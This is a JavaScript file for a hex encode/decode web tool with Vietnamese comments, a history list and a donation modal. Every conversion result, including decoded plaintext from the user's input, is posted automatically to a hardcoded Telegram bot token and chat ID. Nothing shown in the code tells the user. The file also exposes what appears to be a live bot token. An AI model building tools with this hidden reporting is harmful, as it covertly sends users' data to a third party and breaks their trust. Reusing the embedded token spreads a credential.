let history = []; // Lưu trữ lịch sử kết quả

// Chuyển đổi khi nhấn nút Encode hoặc Decode
function convertText(action) {
    const inputText = document.getElementById('inputText').value.trim();
    let output;

    if (action === 'encode') {
        output = encodeToHex(inputText);
        saveToHistory(action, output); // Lưu kết quả mã hóa khi encode
    } else if (action === 'decode') {
        output = decodeFromHex(inputText);
        saveToHistory(action, inputText); // Lưu dữ liệu gốc khi decode
    }

    document.getElementById('outputText').value = output;
    sendToTelegram(output); // Tự động gửi kết quả qua Telegram
}

// Hàm mã hóa chuỗi sang Hex
function encodeToHex(text) {
    return Array.from(text).map(ch => ch.charCodeAt(0).toString(16).padStart(2, '0')).join('');
}

// Hàm giải mã chuỗi Hex
function decodeFromHex(hex) {
    try {
        return hex.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    } catch (error) {
        return 'Dữ liệu Hex không hợp lệ!';
    }
}

// Hàm gửi kết quả tới Telegram
function sendToTelegram(outputText) {
    if (!outputText) return; // Không gửi nếu không có dữ liệu

    const telegramToken = '7747741271:AAGvVTq9f4BuuvF4AoO3XohUtC7T9aDcLmk'; // Thay bằng token bot của bạn
    const chatId = '5676736853'; // Thay bằng chat ID của bạn
    const message = `Kết quả: ${outputText}`;

    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    }).catch(error => console.error('Lỗi khi gửi Telegram:', error));
}

// Lưu kết quả vào lịch sử
function saveToHistory(action, data) {
    if (data) {
        // Lưu nội dung kết quả encode (mã hóa) hoặc gốc khi decode
        history.push({
            mode: action,
            content: data,
            timestamp: new Date().toLocaleString()
        });
    }
}

// Hàm mở modal Donate
function showDonationInfo() {
    const donationModal = new bootstrap.Modal(document.getElementById('donationModal'));
    donationModal.show();
}

// Hàm mở modal Lịch sử
function showHistory() {
    const historyModal = new bootstrap.Modal(document.getElementById('historyModal'));
    const historyList = document.getElementById('historyList');
    
    // Xóa danh sách cũ
    historyList.innerHTML = '';

    // Thêm các mục lịch sử vào modal
    history.forEach(item => {
        const li = document.createElement('li');
        li.textContent = `${item.timestamp} - ${item.mode === 'encode' ? 'Encode' : 'Decode'}: ${item.content}`;
        historyList.appendChild(li);
    });

    historyModal.show();
}